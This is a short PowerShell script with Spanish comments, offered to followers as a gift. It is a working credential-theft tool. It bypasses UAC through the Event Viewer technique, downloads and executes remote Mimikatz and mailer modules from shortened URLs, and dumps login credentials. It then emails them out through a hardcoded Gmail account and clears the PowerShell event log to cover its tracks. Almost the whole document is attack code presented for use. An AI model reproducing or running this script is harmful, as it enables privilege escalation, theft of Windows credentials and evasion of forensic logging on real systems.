# Este script es una forma de disculparme con todos mis suscriptores/seguidores por la larga inactividad, espero entiendan que mi tiempo es muy limitado :D
# What it does?
# 1 - Escala privilegios
# 2 - Obtiene las credenciales de inicio de sesion
# 3 - Envia la informacion al correo especificado

# Funciona con Powershell 3+ o sea con win8+

Function Send-Creds {
	Param (
		$To
	)
	$Command = "
		# Import Send-Email module
		Invoke-Expression (New-Object Net.WebClient).DownloadString('http://bit.ly/2duH9Yu')
		# Import Mimikatz module
		Invoke-Expression (New-Object Net.WebClient).DownloadString('http://bit.ly/1N83FXO')
		`$Creds = Invoke-Mimikatz -DumpCreds
		`$Subject = 'Mimikatz Dump - ' + `$env:COMPUTERNAME + '\' + `$env:USERNAME
		# Send Email
		Send-Email -From 'helloworldgifts@gmail.com' -SecurePassword '01000000d08c9ddf0115d1118c7a00c04fc297eb0100000005b1617bbe90d74e83ae122fd44bc66100000000020000000000106600000001000020000000b3a303edb5c77562c7b5df4926a7fab801181e0d8032c0106e8d9fd721586c98000000000e80000000020000200000001f9dc4dfb3a45d4b617ba5fc1df7f375f6cd67218d2124e63673c3c08ce8e92d3000000057758d45a07fc89fb2d8de4184c0560fc99e571cd6aa035080cbb8bc2de73073eb5c1576bd25129f1c36fe7a73a777214000000001f83ad8a1fae6bb8e8a6987c45eb5fb334354f7633fdc99aba909516bcbb2b8f68904e94ca6d6f53919b5820108fd8efcfd4ce701c847d17ca56a822cfd0f3a' -To '$To' - Subject `$Subject Ejemplo -Body `$Creds
		# Clear EventLog
		Clear-EventLog -LogName 'Windows PowerShell'
	"
	
	# Test Admin
	if ((New-Object Security.Principal.WindowsPrincipal ([Security.Principal.WindowsIdentity]::GetCurrent())).IsInRole([Security.Principal.WindowsBuiltinRole]::Administrator)) {
		Invoke-Expression $Command
	} else {
		## Fileless bypass uac
		# Import EventVwrBypass module
		Invoke-Expression (New-Object Net.WebClient).DownloadString('http://bit.ly/2bKS5oM')
		# Execute bypass w/encoded command
		Invoke-EventVwrBypass -Command ('Powershell -EncodedCommand ' + $([Convert]::ToBase64String($([System.Text.Encoding]::Unicode.GetBytes($Command))))) -Force
	}
}
